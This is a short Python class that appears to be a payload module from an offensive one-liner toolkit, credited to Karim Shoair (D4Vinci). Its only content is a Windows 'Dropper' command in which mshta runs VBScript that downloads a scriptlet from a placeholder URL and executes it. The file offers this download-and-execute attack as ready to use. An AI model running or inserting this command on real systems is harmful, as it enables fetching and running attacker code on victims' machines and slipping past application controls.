class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Download and execute a scriptlet file from a http server."
    function    = "Dropper"
    liner       = 'mshta vbscript:Close(Execute("GetObject(""script:URL"")"))'
